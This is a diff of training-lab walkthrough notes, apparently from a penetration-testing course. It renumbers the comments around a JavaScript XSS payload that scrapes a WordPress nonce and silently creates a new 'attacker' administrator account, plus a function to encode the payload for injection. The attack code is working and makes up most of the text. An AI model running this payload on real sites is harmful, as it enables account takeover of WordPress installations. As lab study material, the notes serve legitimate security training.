@@ -107,7 +107,7 @@ Lab 3 - Capstone Lab: Start Module Exercise VM 1 and add a new administrative ac
 >
 ># Navigate to the "Console" tab and enter the following:
 >
-># Define the function
+># 1. Define the function
 >function encode_to_javascript(string) {
 >    var output = '';
 >    for (let i = 0; i < string.length; i++) {
@@ -117,10 +117,10 @@ Lab 3 - Capstone Lab: Start Module Exercise VM 1 and add a new administrative ac
 >    return output;
 >}
 >
-># Assign your JavaScript payload as a string
+># 2. Assign your JavaScript payload as a string
 >let payload = 'var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);';
 >
-># Encode it
+># 3. Encode it
 >let encoded = encode_to_javascript(payload);
 >console.log(encoded);
 ># ========== Expected Result ==========
